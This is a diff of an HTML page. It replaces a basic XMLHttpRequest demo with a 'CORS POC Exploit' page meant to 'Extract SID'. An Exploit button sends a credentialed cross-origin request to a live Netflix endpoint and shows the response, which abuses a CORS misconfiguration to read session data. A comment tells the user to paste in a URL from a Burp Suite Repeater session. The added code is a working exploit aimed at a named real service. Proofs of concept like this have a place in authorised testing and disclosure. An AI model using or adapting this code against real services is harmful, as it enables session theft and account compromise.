@@ -1,47 +1,29 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>XMLHttpRequest Example</title>
-</head>
 <body>
-    <script>
-        // Create a new XMLHttpRequest object
-        var xhttp = new XMLHttpRequest();
-
-        // Define a callback function to be executed when the request completes
-        xhttp.onreadystatechange = function() {
-            // Check if the request is complete and was successful
-            if (this.readyState === 4 && this.status === 200) {
-                // Alert the response text from the server
-                alert(xhttp.responseText);
-            }
-        };
-
-        // Initialize the request with the HTTP method and URL
-        xhttp.open("GET", "https://sgw.prod.cloud.netflix.com", true);
-
-        // Set the required headers
-        xhttp.setRequestHeader("Sec-Ch-Ua", "\"Not/A)Brand\";v=\"8\", \"Chromium\";v=\"126\"");
-        xhttp.setRequestHeader("Sec-Ch-Ua-Mobile", "?0");
-        xhttp.setRequestHeader("Sec-Ch-Ua-Platform", "\"Linux\"");
-        xhttp.setRequestHeader("Accept-Language", "en-US");
-        xhttp.setRequestHeader("Upgrade-Insecure-Requests", "1");
-        xhttp.setRequestHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.57 Safari/537.36");
-        xhttp.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
-        xhttp.setRequestHeader("Sec-Fetch-Site", "none");
-        xhttp.setRequestHeader("Sec-Fetch-Mode", "navigate");
-        xhttp.setRequestHeader("Sec-Fetch-User", "?1");
-        xhttp.setRequestHeader("Sec-Fetch-Dest", "document");
-        xhttp.setRequestHeader("Origin", "https://royalboy2000.github.io");
-        xhttp.setRequestHeader("Accept-Encoding", "gzip, deflate, br");
-        xhttp.setRequestHeader("Priority", "u=0, i");
-        xhttp.setRequestHeader("Connection", "keep-alive");
-
-        // Include credentials (cookies, authorization headers, etc.) with the request
-        xhttp.withCredentials = true;
-
-        // Send the request to the server
-        xhttp.send();
-    </script>
+<center>
+<h2>CORS POC Exploit</h2>
+<h3>Extract SID</h3>
+ 
+<div id="demo">
+<button type="button" onclick="cors()">Exploit</button>
+</div>
+ 
+<script>
+function cors() {
+  var xhttp = new XMLHttpRequest();
+  xhttp.onreadystatechange = function() {
+    if (this.readyState == 4 && this.status == 200) {
+      document.getElementById("demo").innerHTML = alert(this.responseText);
+    }
+  };
+  xhttp.onload = cors;
+  <! –– In the below line, change the URL to the proper one from Repeater -->
+  xhttp.open("GET", "https://sgw.prod.cloud.netflix.com/", true);
+  xhttp.withCredentials = true;
+  xhttp.send();
+}
+</script>
+ 
 </body>
 </html>
